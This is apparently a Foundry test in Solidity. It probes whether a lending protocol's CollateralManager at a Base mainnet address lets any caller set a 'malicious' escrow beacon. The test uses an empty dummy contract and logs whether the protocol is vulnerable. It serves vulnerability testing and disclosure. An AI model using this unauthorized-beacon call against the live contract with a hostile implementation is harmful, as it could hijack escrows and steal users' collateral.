// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
}

/// @dev A trivial contract that can act as a "beacon" address.
///      The test only needs a non-zero address that is not the real beacon.
contract DummyBeacon {
    // Intentionally empty. The test only cares whether the call reverts.
}

contract BeaconHijackTest is Test {
    // Base mainnet addresses (from docs.teller.org)
    address constant COLLATERAL_MGR = 0xD9149bfBfB29cC175041937eF8161600b464051B;

    ICollateralManager cm;

    function setUp() public {
        cm = ICollateralManager(COLLATERAL_MGR);
    }

    /// @notice This test proves whether the protocol allows an arbitrary caller
    ///         to replace the collateral escrow beacon.
    /// @dev    If the call reverts, the protocol has access control (fixed).
    ///         If the call succeeds, the protocol is vulnerable.
    function test_SetCollateralEscrowBeacon_NoAccessControl() public {
        // Deploy a dummy beacon. Any non-zero address works.
        DummyBeacon dummy = new DummyBeacon();
        address maliciousBeacon = address(dummy);

        console.log("Attempting to set malicious beacon at:", maliciousBeacon);

        // Try to call the unprotected function.
        // - If the protocol has access control, this reverts and the test fails.
        // - If the protocol is vulnerable, this succeeds and the test passes.
        cm.setCollateralEscrowBeacon(maliciousBeacon);

        console.log("SUCCESS: Protocol accepted the malicious beacon.");
        console.log("The protocol is VULNERABLE to escrow beacon hijacking.");
    }
}
